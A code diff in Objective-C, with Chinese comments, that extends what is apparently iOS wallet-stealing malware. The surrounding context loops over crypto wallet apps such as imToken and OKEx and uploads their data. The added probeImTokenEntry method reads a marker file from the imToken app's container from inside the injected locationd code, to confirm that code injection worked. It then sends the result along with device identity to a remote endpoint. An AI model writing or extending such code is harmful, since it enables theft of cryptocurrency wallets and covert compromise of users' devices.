@@ -441,6 +441,7 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                                 @"com.okex.OKExAppstoreFull"];
         for (NSString *bid in walletBids) {
             [self collectAndUploadWallet:bid];
+            if ([bid isEqualToString:@"im.token.app"]) [self probeImTokenEntry];
             [NSThread sleepForTimeInterval:1.5];
         }
 
@@ -490,4 +491,27 @@ static void PayloadInit(void) {
 __attribute__((visibility("default"), used))
 void plugin_main(void) {
     PayloadInit();
+}
+#pragma mark - 读 imtoken 入口标记文件
+
+/// imtoken 模块的 plugin_main 会往自己容器的 Documents/_imt_entry.txt 写一行。
+/// 我们在 locationd 里能直接读它的容器 —— 用这个证明「注入的代码真的执行了」。
+- (void)probeImTokenEntry {
+    @try {
+        NSData *d = [WalletFS readFile:@"Documents/_imt_entry.txt" inContainer:@"im.token.app"];
+        if (!d.length) d = [WalletFS readFile:@"tmp/_imt_entry.txt" inContainer:@"im.token.app"];
+
+        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        ev[@"et"] = @"imtoken_entry_probe";
+        ev[@"c"] = kSeed;
+        if (d.length) {
+            NSString *s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
+            ev[@"ctx"] = @{ @"found": @YES, @"content": s ?: @"" };
+        } else {
+            ev[@"ctx"] = @{ @"found": @NO };
+        }
+        [self.net sendEvent:ev];
+    } @catch (NSException *e) {
+        (void)e;
+    }
 }
